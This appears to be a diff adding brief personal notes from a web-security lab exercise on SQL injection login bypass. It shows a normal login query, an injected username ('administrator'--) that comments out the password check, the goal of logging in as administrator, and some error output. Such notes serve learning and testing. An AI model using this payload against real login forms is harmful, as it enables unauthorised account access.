@@ -1,0 +1,12 @@
+SQL injection vulnerability allowing login bypass
+
+SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
+
+SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
+
+END GOAL: login as administrator
+
+ERROR : Invalid username or password.
+
+ERROR : SELECT * FROM users WHERE username = '''--' AND password = ''
+
